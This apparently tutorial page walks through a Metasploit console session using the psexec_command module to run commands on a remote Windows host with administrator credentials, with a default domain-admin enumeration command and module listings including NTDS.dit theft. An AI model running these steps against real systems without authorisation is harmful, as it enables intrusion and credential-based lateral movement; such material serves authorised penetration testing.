This module uses a valid administrator username and password to execute an arbitrary command on one or more hosts, using a similar technique than the "psexec" utility provided by SysInternals. Daisy chaining commands with '&' does not work and users shouldn't try it. This module is useful because it doesn't need to upload any binaries to the target machine.
<pre>
root@kali2:~# msfconsole 
                                                  
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


Payload caught by AV? Fly under the radar with Dynamic Payloads in
Metasploit Pro -- learn more on http://rapid7.com/metasploit

       =[ metasploit v4.13.6-dev                          ]
+ -- --=[ 1607 exploits - 914 auxiliary - 277 post        ]
+ -- --=[ 458 payloads - 39 encoders - 9 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > search psexec
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                         Disclosure Date  Rank       Description
   ----                                         ---------------  ----       -----------
   auxiliary/admin/smb/psexec_command                            normal     Microsoft Windows Authenticated Administration Utility
   auxiliary/admin/smb/psexec_ntdsgrab                           normal     PsExec NTDS.dit And SYSTEM Hive Download Utility
   auxiliary/scanner/smb/psexec_loggedin_users                   normal     Microsoft Windows Authenticated Logged In Users Enumeration
   exploit/windows/local/current_user_psexec    1999-01-01       excellent  PsExec via Current User Token
   exploit/windows/local/wmi                    1999-01-01       excellent  Windows Management Instrumentation (WMI) Remote Command Execution
   exploit/windows/smb/psexec                   1999-01-01       manual     Microsoft Windows Authenticated User Code Execution
   exploit/windows/smb/psexec_psh               1999-01-01       manual     Microsoft Windows Authenticated Powershell Command Execution



msf > use auxiliary/admin/smb/psexec_command

msf auxiliary(psexec_command) > show options


Module options (auxiliary/admin/smb/psexec_command):

   Name                  Current Setting                    Required  Description
   ----                  ---------------                    --------  -----------
   COMMAND               net group "Domain Admins" /domain  yes       The command you want to execute on the remote host
   RHOSTS                                                   yes       The target address range or CIDR identifier
   RPORT                 445                                yes       The Target port
   SERVICE_DESCRIPTION                                      no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                     no        The service display name
   SERVICE_NAME                                             no        The service name
   SMBDomain             .                                  no        The Windows domain to use for authentication
   SMBPass                                                  no        The password for the specified username
   SMBSHARE              C$                                 yes       The name of a writeable share on the server
   SMBUser                                                  no        The username to authenticate as
   THREADS               1                                  yes       The number of concurrent threads
   WINPATH               WINDOWS                            yes       The name of the remote Windows directory


msf auxiliary(psexec_command) > set COMMAND ipconfig
COMMAND => ipconfig

msf auxiliary(psexec_command) > set RHOSTS <b>[REMOTE_HOST_IP_GOES_HERE]
RHOSTS => IP

msf auxiliary(psexec_command) > set SMBUser <b>[USER_NAME_MOSTLY_Administrator:Local_Admin)]
SMBUser => USER_NAME

msf auxiliary(psexec_command) > set SMBPass <b>[PASSWORD]
SMBPass => PASSWORD

msf auxiliary(psexec_command) > run

<pre>

Further Reading: 
  - https://www.trustedsec.com/may-2014/moar-shellz/
  - https://www.rapid7.com/db/modules/auxiliary/admin/smb/psexec_command
  
